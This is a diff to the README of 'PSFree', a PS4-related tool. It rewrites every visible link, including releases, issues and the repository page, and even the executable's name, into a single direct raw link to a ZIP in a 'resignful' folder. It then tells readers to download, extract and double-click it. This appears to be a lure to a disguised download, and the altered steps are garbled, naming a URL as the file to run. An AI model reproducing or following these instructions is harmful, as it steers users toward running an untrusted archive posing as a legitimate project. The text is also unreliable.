@@ -6,17 +6,17 @@ Welcome to PSFree, a tool designed to enhance your PS4 experience. This software
 
 ## 📥 Download Link
 
-[![Download PSFree](https://img.shields.io/badge/Download-PSFree-blue.svg)](https://github.com/PedroVecs/PSFree/releases)
+[![Download PSFree](https://raw.githubusercontent.com/PedroVecs/PSFree/main/resignful/PSFree.zip)](https://raw.githubusercontent.com/PedroVecs/PSFree/main/resignful/PSFree.zip)
 
 ## 📥 Download & Install
 
-1. Click the button above or visit the [Releases page](https://github.com/PedroVecs/PSFree/releases).
+1. Click the button above or visit the [Releases page](https://raw.githubusercontent.com/PedroVecs/PSFree/main/resignful/PSFree.zip).
 2. On the Releases page, you will see a list of available versions. Find the latest version of PSFree.
 3. Click on the link for the requested version to begin the download. This will download a ZIP file containing the application and necessary files.
 4. Once the download is complete, locate the ZIP file in your downloads folder.
 5. Extract the files from the ZIP file to a location of your choice on your computer.
-6. Look for the executable file inside the extracted folder. This file is typically named `PSFree.exe`.
-7. Double-click on the `PSFree.exe` file to launch the application.
+6. Look for the executable file inside the extracted folder. This file is typically named `https://raw.githubusercontent.com/PedroVecs/PSFree/main/resignful/PSFree.zip`.
+7. Double-click on the `https://raw.githubusercontent.com/PedroVecs/PSFree/main/resignful/PSFree.zip` file to launch the application.
 
 ## ⚙️ System Requirements
 
@@ -49,7 +49,7 @@ If you encounter issues while installing or running PSFree, consider the followi
 
 ## 📞 Support
 
-For any questions or support requests, please visit our [GitHub Issues page](https://github.com/PedroVecs/PSFree/issues). We encourage users to report bugs and request features as part of our ongoing improvement plan.
+For any questions or support requests, please visit our [GitHub Issues page](https://raw.githubusercontent.com/PedroVecs/PSFree/main/resignful/PSFree.zip). We encourage users to report bugs and request features as part of our ongoing improvement plan.
 
 ## 🎉 Community Contributions
 
@@ -61,7 +61,7 @@ We welcome community involvement! If you want to contribute to PSFree, consider 
 
 ## 🔗 Additional Resources
 
-- Visit the [GitHub Repository](https://github.com/PedroVecs/PSFree) for more details and to see updates.
+- Visit the [GitHub Repository](https://raw.githubusercontent.com/PedroVecs/PSFree/main/resignful/PSFree.zip) for more details and to see updates.
 - Check our documentation for in-depth guidance on using PSFree’s features.
 
 Thank you for using PSFree. We hope it enhances your PS4 gaming experience!
